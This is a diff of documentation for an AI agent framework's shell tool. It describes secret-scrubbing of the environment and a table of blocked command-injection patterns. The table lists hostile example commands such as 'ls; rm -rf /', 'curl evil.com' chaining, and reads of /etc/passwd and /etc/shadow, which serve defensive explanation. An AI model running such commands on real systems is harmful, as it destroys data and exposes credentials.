@@ -1,14 +1,11 @@
 ---
-title: Shell Tool
-sidebarTitle: Shell Tool
+title: Shell Commands
 description: Execute shell commands with environment scrubbing and injection detection
 ---
 
 The `shell` tool lets the agent execute shell commands on the host system. Because shell access is powerful, IronClaw applies two layers of protection before any command runs: environment scrubbing and command injection detection.
 
-<Warning>
-The shell tool requires `ALLOW_LOCAL_TOOLS=true` and gives the agent direct command execution on your machine. Enable only when you trust the agent to operate at this level. Consider using the Docker sandbox instead for untrusted workloads.
-</Warning>
+---
 
 ## Configuration
 
@@ -18,29 +15,7 @@ export ALLOW_LOCAL_TOOLS=true
 
 Without this setting, the `shell` tool is not registered and is invisible to the LLM.
 
-## Parameters
-
-```json
-{
-  "type": "object",
-  "properties": {
-    "command": {
-      "type": "string",
-      "description": "The shell command to execute."
-    },
-    "working_dir": {
-      "type": "string",
-      "description": "Working directory for the command. Defaults to the workspace root."
-    },
-    "timeout_secs": {
-      "type": "integer",
-      "description": "Maximum time to wait for the command to complete. Default: 30.",
-      "default": 30
-    }
-  },
-  "required": ["command"]
-}
-```
+---
 
 ## Environment Scrubbing
 
@@ -48,23 +23,25 @@ Before executing any command, the shell tool builds a sanitized environment. Sen
 
 **Variables that are scrubbed:**
 
-| Category | Examples |
-|----------|---------|
-| API keys and tokens | `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `NEARAI_API_KEY`, `NEARAI_SESSION_TOKEN` |
-| Database credentials | `DATABASE_URL`, `LIBSQL_AUTH_TOKEN` |
-| Auth tokens | `GATEWAY_AUTH_TOKEN`, `HTTP_WEBHOOK_SECRET` |
-| Any variable matching `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD` | Pattern-based scrubbing |
+| Category                                                           | Examples                                                                        |
+|--------------------------------------------------------------------|---------------------------------------------------------------------------------|
+| API keys and tokens                                                | `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `NEARAI_API_KEY`, `NEARAI_SESSION_TOKEN` |
+| Database credentials                                               | `DATABASE_URL`, `LIBSQL_AUTH_TOKEN`                                             |
+| Auth tokens                                                        | `GATEWAY_AUTH_TOKEN`, `HTTP_WEBHOOK_SECRET`                                     |
+| Any variable matching `*_KEY`, `*_SECRET`, `*_TOKEN`, `*_PASSWORD` | Pattern-based scrubbing                                                         |
 
 **Variables that are preserved:**
 
-| Variable | Reason |
-|----------|--------|
-| `PATH` | Required for command resolution |
-| `HOME` | Required for tools that read config from home dir |
-| `USER`, `SHELL` | Safe context variables |
-| `LANG`, `LC_*` | Locale settings |
+| Variable        | Reason                                            |
+|-----------------|---------------------------------------------------|
+| `PATH`          | Required for command resolution                   |
+| `HOME`          | Required for tools that read config from home dir |
+| `USER`, `SHELL` | Safe context variables                            |
+| `LANG`, `LC_*`  | Locale settings                                   |
 
 **Why this matters:** Without scrubbing, a command like `env` or `printenv` — or a compromised binary on PATH — could dump all environment variables, including API keys, to stdout. The shell tool prevents this by ensuring secrets are never in the environment to begin with.
+
+---
 
 ## Command Injection Detection
 
@@ -72,15 +49,15 @@ The sanitizer analyzes every command before execution and blocks patterns common
 
 ### Blocked Patterns
 
-| Pattern | Example | Why blocked |
-|---------|---------|-------------|
-| Command chaining with `;` | `ls; rm -rf /` | Executes second command unconditionally |
-| Logical chaining with `&&` | `echo ok && curl evil.com` | Executes second command on success |
-| Logical chaining with `\|\|` | `false \|\| curl evil.com` | Executes second command on failure |
-| Subshells with `$()` | `echo $(cat /etc/passwd)` | Embeds command output |
-| Backtick subshells | `` echo `id` `` | Embeds command output |
-| Path traversal | `cat ../../../etc/shadow` | Escapes intended directory |
-| Null bytes | `command\x00injection` | Terminates strings in C functions |
+| Pattern                      | Example                    | Why blocked                             |
+|------------------------------|----------------------------|-----------------------------------------|
+| Command chaining with `;`    | `ls; rm -rf /`             | Executes second command unconditionally |
+| Logical chaining with `&&`   | `echo ok && curl evil.com` | Executes second command on success      |
+| Logical chaining with `\|\|` | `false \|\| curl evil.com` | Executes second command on failure      |
+| Subshells with `$()`         | `echo $(cat /etc/passwd)`  | Embeds command output                   |
+| Backtick subshells           | `` echo `id` ``            | Embeds command output                   |
+| Path traversal               | `cat ../../../etc/shadow`  | Escapes intended directory              |
+| Null bytes                   | `command\x00injection`     | Terminates strings in C functions       |
 
 ### Blocked Examples
 
@@ -121,6 +98,8 @@ echo $HOME
 Pipe (`|`) within a single command is allowed because it does not chain independent commands — it passes stdout of one program to stdin of another within the same execution context.
 </Note>
 
+---
+
 ## Output Sanitization
 
 Shell output passes through the Safety Layer before reaching the LLM:
@@ -135,6 +114,8 @@ The output is wrapped before the LLM sees it:
   [command stdout/stderr]
 </tool_output>
 ```
+
+---
 
 ## Security Considerations
 
@@ -151,19 +132,3 @@ The output is wrapped before the LLM sees it:
     Commands that exceed `timeout_secs` are killed. The default is 30 seconds. For long-running tasks, either increase the timeout or consider using a background job instead.
   </Accordion>
 </AccordionGroup>
-
-## Next Steps
-
-<CardGroup cols={3}>
-  <Card title="File Tools" icon="file" href="/tools/file-tools">
-    Filesystem access without command execution
-  </Card>
-
-  <Card title="Sandbox" icon="container" href="/security/sandbox">
-    Docker-based isolation for untrusted execution
-  </Card>
-
-  <Card title="Safety Layer" icon="shield" href="/security/safety-layer">
-    Sanitizer, policy, and leak detector
-  </Card>
-</CardGroup>
